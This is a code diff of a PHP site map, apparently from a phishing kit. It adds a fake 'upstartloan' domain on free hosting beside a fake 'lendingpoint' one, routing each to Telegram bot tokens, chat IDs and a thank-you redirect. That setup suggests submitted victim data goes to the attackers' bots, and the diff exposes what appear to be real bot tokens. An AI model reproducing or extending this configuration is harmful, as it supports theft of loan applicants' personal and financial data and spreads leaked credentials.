@@ -12,6 +12,16 @@ $site_map = [
         ],
         'redirect' => 'https://lendingpoint.ct.ws/cache_site/lendingpoint/thankyou.html'
     ],
+
+    'upstartloan.rf.gd' => [
+        'bots' => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA', 'chat_id' => '6108491247']
+
+        ],
+        'redirect' => 'https://upstartloan.rf.gd/cache_site/thankyou.html'
+    ],
+
     'site2.com' => [
         'bots' => [
             ['token' => '7570530329:AAGCyvAYZQd45RebzrTY1oHoDEOmxe1ackI', 'chat_id' => '6494353790'],
